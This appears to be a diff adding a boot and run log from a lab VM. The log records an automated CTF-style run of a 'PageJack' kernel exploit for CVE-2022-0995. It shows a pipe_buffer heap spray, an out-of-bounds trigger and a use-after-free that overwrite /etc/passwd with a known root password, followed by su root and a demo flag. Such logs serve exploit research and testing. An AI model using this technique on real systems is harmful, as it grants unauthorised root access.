@@ -1,0 +1,51 @@
+SeaBIOS (version 1.17.0-10.fc44)
+
+iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+1EFCBBC0+1EF0BBC0 CA00
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...
+                                                                               
+
+Booting from ROM..
+Boot took 2.56 seconds
+
+ifconfig: SIOCSIFADDR: No such device
+route: ioctl 0x890b failed: Network unreachable
+=== AUTO RUN: ctf runs the PageJack exploit (up to 5 attempts) ===
+########## ATTEMPT 1 ##########
+[RLIMIT_NOFILE] soft limit= 0x1000 	 hard limit= 0x1000
+[RLIMIT_AS] soft limit= 0x8000000000000000 	 hard limit= 0x8000000000000000
+[*] CVE-2022-0995 by Lotus
+[*] spray pipe_buffer...
+[+] edit the pipe_buffer size to 0x60
+[*] allocating pipe pages...
+[*] Create 2 holes in pipe_buffer...
+[+] Trigger OOB
+[*] finding...
+[*]Not hit.
+########## ATTEMPT 2 ##########
+[RLIMIT_NOFILE] soft limit= 0x1000 	 hard limit= 0x1000
+[RLIMIT_AS] soft limit= 0x8000000000000000 	 hard limit= 0x8000000000000000
+[*] CVE-2022-0995 by Lotus
+[*] spray pipe_buffer...
+[+] edit the pipe_buffer size to 0x60
+[*] allocating pipe pages...
+[*] Create 2 holes in pipe_buffer...
+[+] Trigger OOB
+[*] finding...
+found pipe coincide at idx:1921 and 1920
+[*] uaf one of the pipe_buffer->page
+[*] Spray pwd file struct...
+[*] Edit pwd file->f_mode...
+Setting root password to "Lotus"...
+[*] finally: edit the pwd file
+Write Success:112!
+[*] Now the password is:
+root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh
+
+=== SUCCESS: /etc/passwd modified on attempt 2 ===
+=== EXP FINISHED, now checking passwd ===
+root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh
+=== attempting su root and reading flag (password: Lotus) ===
+flag{PageJack_Demo_Flag_ZJU_RKP}
+FLAG_READ_SUCCESS
+=== AUTO RUN DONE, powering off ===
+[    3.791258] reboot: Power down
